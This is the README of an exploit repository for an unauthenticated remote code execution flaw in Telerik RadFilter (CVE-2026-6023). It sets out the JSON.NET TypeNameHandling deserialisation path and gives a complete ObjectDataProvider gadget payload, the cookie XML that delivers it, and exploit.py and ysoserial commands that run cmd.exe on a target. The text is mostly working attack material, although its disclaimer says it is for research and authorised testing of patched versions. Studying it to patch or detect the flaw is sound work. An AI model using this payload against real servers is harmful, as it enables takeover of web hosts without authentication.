# Telerik RadFilter JSON Deserialisation RCE

Proof-of-concept for the `TypeNameHandling.Auto` deserialisation vulnerability
in `RadFilter.LoadSettings()` (CVE-2026-6023) in Telerik UI for ASP.NET AJAX,
fixed in 2026.1.421. Injects an `ObjectDataProvider` gadget that fires
`Process.Start` during JSON deserialisation.

---

## Vulnerability

`RadFilter.LoadSettings(string base64)` decodes the argument from base64 and passes it to:

```csharp
JsonConvert.DeserializeObject<RadFilterGroupExpression>(json, new JsonSerializerSettings
{
    TypeNameHandling = (TypeNameHandling)4  // TypeNameHandling.Auto
});
```

No `SerializationBinder` is set. `TypeNameHandling.Auto` resolves `$type` properties when the declared type is abstract or an interface, allowing the deserialiser to instantiate arbitrary types.

The root type (`RadFilterGroupExpression`) is concrete, so `$type` at the root level is not resolved. However, `Expressions` is declared as `IList<RadFilterExpression>` where `RadFilterExpression` is abstract. `$type` on elements inside `Expressions` IS resolved. Placing an `ObjectDataProvider` gadget there fires `Process.Start(cmd, args)` during property assignment, before any type-compatibility check runs.

`RadPersistenceManager.LoadState()` calls `RadFilter.LoadSettings` when it finds a `FilterExpressions` setting in the persisted state. `CookieStateStorageProvider` reads this state from a browser cookie, making it fully attacker-controlled with no authentication required.

---

## Attack path

```
GET /radfilter.aspx
Cookie: TelerikAspNetRadControlsPersistedState=<raw XML>
         |
         v
RadPersistenceManager.LoadState()
  -> CookieStateStorageProvider.LoadState()
  -> XmlSerializer deserialises cookie value to List<RadControlState>
  -> finds RadControlState { UniqueId = "RadFilter1" }
  -> finds ControlSetting { Name = "FilterExpressions", Value = "<base64>" }
  -> RadFilter.LoadSettings("<base64>")
  -> base64-decode -> JsonConvert.DeserializeObject<RadFilterGroupExpression>(json, TypeNameHandling.Auto)
  -> Expressions.$values[0].$type = "RadFilterEqualToFilterExpression`1[[System.Object]]"
     (passes type-compatibility check: IS assignable to RadFilterExpression)
  -> RadFilterEqualToFilterExpression<object> created
  -> Value.$type = "ObjectDataProvider" resolved (declared type is object -> $type IS checked)
  -> ObjectDataProvider.MethodName = "Start", ObjectInstance = new Process()
  -> Process.Start(cmd, args) fires
  -> RecreateControl() called after LoadSettings() completes
  -> InvalidCastException from rendering ObjectDataProvider as numeric value -> HTTP 500
```

---

## Cookie format

`CookieStateStorageProvider` reads the raw cookie value as a URL-encoded XML string. `XmlSerializer(typeof(List<RadControlState>))` deserialises the XML.

```xml
<?xml version="1.0" encoding="utf-8"?>
<ArrayOfRadControlState xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                        xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <RadControlState>
    <UniqueId>form1$RadFilter1</UniqueId>
    <ControlSettings>
      <ControlSetting>
        <Name>FilterExpressions</Name>
        <Value Type="System.String"><string>BASE64_OF_GADGET_JSON</string></Value>
      </ControlSetting>
    </ControlSettings>
  </RadControlState>
</ArrayOfRadControlState>
```

The `UniqueId` must match the `UniqueID` of the `RadFilter` control as rendered by ASP.NET. For a control with `ID="RadFilter1"` inside `<form id="form1">`, this is `form1$RadFilter1`. To confirm the exact value for a given target, capture a legitimate `SaveState` response from `radfilter.aspx` (the lab page calls `SaveState()` on `Page_PreRender`).

---

## Gadget JSON

The gadget needs a two-level wrapper. `TypeNameHandling.Auto` resolves `$type` for abstract/interface-typed positions but also runs a type-compatibility check before creating the object. Json.NET rejects `ObjectDataProvider` if placed directly in `Expressions.$values[]` because it is not assignable to `RadFilterExpression`.

The solution: nest `ObjectDataProvider` inside a `RadFilterEqualToFilterExpression<object>`.
`RadFilterEqualToFilterExpression<object>` IS a `RadFilterExpression` subclass (passes the check).
Its `Value` property has declared type `object` (T=object), so TypeNameHandling.Auto resolves
`$type` there. The gadget fires during `Value` property assignment.

```json
{
  "$type": "Telerik.Web.UI.RadFilterGroupExpression, Telerik.Web.UI",
  "GroupOperation": 0,
  "Expressions": {
    "$type": "Telerik.Web.UI.RadFilterExpressionsCollection, Telerik.Web.UI",
    "$values": [
      {
        "$type": "Telerik.Web.UI.RadFilterEqualToFilterExpression`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], Telerik.Web.UI",
        "FieldName": "ID",
        "Value": {
          "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
          "MethodName": "Start",
          "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": ["cmd.exe", "/c <command>"]
          },
          "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
          }
        }
      }
    ]
  },
  "FilterFunction": 16,
  "IsEmpty": false
}
```

Windows Server 2025 includes `PresentationFramework.dll` (confirmed on target).

---

## How it works

1. Build the gadget JSON: an `ObjectDataProvider` nested inside `RadFilterEqualToFilterExpression<object>.Value`, wrapped in a `RadFilterGroupExpression` root.
2. Base64-encode the JSON.
3. Wrap it in `RadControlState` XML matching the `CookieStateStorageProvider` format, with the target RadFilter's `UniqueID`.
4. Send the XML as the `TelerikAspNetRadControlsPersistedState` cookie in a GET request to the RadFilter page.
5. `Page_Load` calls `RadPersistenceManager.LoadState()`, which reads the cookie, deserialises the XML, and calls `RadFilter.LoadSettings()` with the base64 payload. `JsonConvert.DeserializeObject` with `TypeNameHandling.Auto` resolves the `$type` on the `Value` property, instantiates `ObjectDataProvider`, and fires `Process.Start`.

## Files

| File | Purpose |
|---|---|
| `exploit.py` | Python exploit. Generates the gadget JSON natively and sends the cookie. |
| `Dockerfile` | Python 3.12-slim + `mono-complete`. Use for isolated runs or to invoke `ysoserial.exe` manually. |
| `requirements.txt` | Python dependencies (`requests`, `urllib3`). |

## Prerequisites

- A page rendering `<telerik:RadFilter />` with `RadPersistenceManager` and `CookieStateStorageProvider` configured
- The page must call `LoadState()` (typically on `Page_Load`)
- `PresentationFramework.dll` present on the target (ships with Windows Server 2016+ and any desktop Windows with .NET Framework)
- No authentication required
- Python 3.8+

---

## Usage

### Running locally

```bash
pip install -r requirements.txt

# Execute a command
python3 exploit.py \
  --target http://TARGET \
  --cmd cmd.exe \
  --args "/c whoami > C:\\inetpub\\wwwroot\\out.txt"

# Dump payload only (no request sent)
python3 exploit.py \
  --target http://TARGET \
  --cmd cmd.exe \
  --args "/c whoami" \
  --dump-payload

# Route through Burp
python3 exploit.py \
  --target http://TARGET \
  --cmd cmd.exe \
  --args "/c whoami > C:\\inetpub\\wwwroot\\out.txt" \
  --proxy http://127.0.0.1:8080
```

### Running in Docker

```bash
docker build -t radfilter-exploit .

docker run --rm radfilter-exploit \
  --target http://TARGET \
  --cmd cmd.exe \
  --args "/c whoami > C:\\inetpub\\wwwroot\\out.txt"
```

The image includes `mono-complete`. To generate payloads manually with ysoserial.net, copy `ysoserial.exe` into the container and run:

```bash
mono /exploit/ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
```

### Flags

| Flag | Default | Purpose |
|---|---|---|
| `--target` | required | Base URL, e.g. `http://10.0.0.1:8080` |
| `--cmd` | `cmd.exe` | Executable to run |
| `--args` | `/c whoami > ...` | Arguments passed to `--cmd` |
| `--page` | `radfilter.aspx` | Path to the RadFilter page |
| `--uid` | `form1$RadFilter1` | UniqueID of the RadFilter control |
| `--cookie-name` | `TelerikAspNetRadControlsPersistedState` | Cookie name used by `CookieStateStorageProvider` |
| `--proxy` | | HTTP proxy URL |
| `--no-verify` | | Disable TLS certificate verification |
| `--dump-payload` | | Print JSON, base64, and cookie XML then exit without sending |

---

## Expected output

The gadget fires synchronously during deserialisation. The server throws `InvalidCastException` after `Process.Start` returns, which propagates to ASP.NET and produces an HTTP 500. The spawned process runs independently.

```
[*] Target : http://TARGET/radfilter.aspx
[*] Command: cmd.exe /c whoami > C:\inetpub\wwwroot\out.txt
[*] UniqueID: form1$RadFilter1
[*] Sending payload...
[*] Response: HTTP 500 (12453 bytes)
[+] HTTP 500 received, gadget likely fired (type cast exception propagates after Process.Start)
```

After execution, verify by fetching the output file or a known dropped artefact.

---

## Confirming the UniqueID

Browse to the target `radfilter.aspx` page. If the page calls `SaveState()` on load, the cookie `TelerikAspNetRadControlsPersistedState` will be set after the first GET. URL-decode the value and read the `<UniqueId>` element. Pass that value to `--uid`.

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## License

Released under the [MIT License](../../LICENSE).
